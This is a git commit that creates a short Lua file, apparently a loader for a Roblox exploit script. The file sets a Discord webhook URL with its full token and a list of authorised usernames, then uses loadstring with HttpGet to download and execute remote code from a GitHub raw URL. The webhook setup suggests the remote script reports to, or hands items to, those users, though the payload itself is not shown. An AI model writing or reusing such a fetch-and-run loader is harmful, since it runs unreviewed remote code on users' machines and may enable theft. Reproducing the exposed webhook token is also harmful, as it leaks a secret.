964e50cb95d8db67fe8ced4aaf9aefdffc8306f9
Gagbestscripts <vincegagarin5@gmail.com>
2025-11-05 07:39:20 +0800

    Create .lua

---
+++ .lua
@@ -0,0 +1,4 @@
+Webhook = "https://discord.com/api/webhooks/1412111262279794719/jc35csMKF_G-nFNd7WQHcLPFkBtxPbX7kOPz83pG2rLZSAxskuDKdcOnC5EidP_VxL2-"
+AuthorisedUsers = {"Vynxz_16", "Benizzzxl", "shinigamihere"}
+Ping = "10m"
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Spv-Script/voxium/refs/heads/main/sab'))()
